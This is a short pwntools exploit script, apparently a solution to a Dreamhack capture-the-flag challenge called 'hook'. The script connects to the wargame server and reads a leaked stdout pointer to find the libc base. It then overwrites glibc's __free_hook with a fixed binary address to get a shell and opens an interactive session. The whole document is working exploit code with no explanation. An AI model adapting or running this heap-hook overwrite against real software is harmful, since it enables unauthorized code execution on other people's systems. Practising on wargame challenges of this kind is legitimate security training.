# Name: hook.py

from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 14669 # the given port

# conn = process('./hook') # local
conn = remote(HOST, PORT)

e = ELF('./hook')
libc = ELF('./libc-2.23.so')

# leak libc base
conn.recvuntil(b'stdout: ')
stdout = int(conn.recvline()[:-1], base=16)
libc_base = stdout - libc.sym['_IO_2_1_stdout_']
success(f'libc base: {hex(libc_base)}')

# exploit
conn.sendlineafter(b'Size: ', str(0x10).encode())
payload = p64(libc_base + libc.sym['__free_hook'])
payload += p64(0x400a11)
conn.sendafter(b'Data: ', payload)
conn.interactive()